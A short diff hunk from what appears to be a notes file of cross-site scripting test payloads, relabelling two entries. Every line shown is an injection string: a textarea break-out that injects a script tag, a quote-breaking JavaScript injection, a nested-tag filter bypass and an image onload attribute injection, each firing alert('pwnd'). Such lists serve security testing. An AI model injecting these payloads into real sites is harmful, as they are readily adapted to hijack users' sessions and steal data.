@@ -13,5 +13,5 @@ examples:
         more elegant maybe?: </textarea><script>alert('pwnd');</script><textarea>
     ';alert('pwnd');//
         or maybe append with?: </script> or <!--
-    good old <sscriptcript> --> <script>
-    /images/pic.jpg" onload="alert('pwnd');
+    good old: <sscriptcript> --> <script>
+    img onload: /images/pic.jpg" onload="alert('pwnd');
